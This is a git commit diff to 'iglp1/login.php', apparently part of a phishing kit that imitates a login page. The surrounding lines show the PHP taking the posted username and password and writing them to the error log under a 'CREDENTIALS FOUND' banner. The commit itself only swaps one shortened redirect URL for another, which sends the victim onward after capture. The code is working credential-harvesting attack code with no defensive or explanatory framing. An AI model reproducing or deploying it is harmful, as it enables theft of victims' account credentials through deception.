e477d20470470babea32dd0ba0f40041350141d8
mranon0 <103735483+mranon0@users.noreply.github.com>
2022-04-15 14:00:14 +0530

    Update login.php

--- iglp1/login.php
+++ iglp1/login.php
@@ -4,5 +4,5 @@ $password = $_POST['password'];
 $res = "[+++++++++++ CREDENTIALS FOUND +++++++++] Username: $username <--|+++++++++++++++++|--> Password: $password";
 error_log("[+] Credentials Found!!!");
 error_log("$res");
-echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcl'</script>";
+echo "<script type='text/javascript'>window.location='https://shorturl.ae/WNpcJ'</script>";
 ?>
